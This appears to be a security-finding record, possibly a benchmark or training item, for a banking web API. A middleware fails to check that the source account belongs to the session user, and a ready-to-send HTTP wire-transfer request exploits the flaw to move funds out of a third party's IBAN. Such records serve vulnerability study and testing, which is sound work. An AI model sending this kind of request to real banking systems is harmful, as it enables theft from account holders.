diagnosis: The resolveSourceAccount middleware locates a source bank account using sourceIban provided in the request body, but fails to check whether res.locals.sourceAccount.userId matches req.session.userId. An authenticated attacker can initiate unauthorized wire transfers draining third-party accounts.
exploit_request:
POST /api/transfers/wire HTTP/1.1
Host: bank.onlineportal.com
Cookie: session_id=attacker_session
Content-Type: application/json

{"sourceIban": "GB29NWBK60161331926819", "destinationIban": "DE89370400440532013000", "amount": 10000.00}
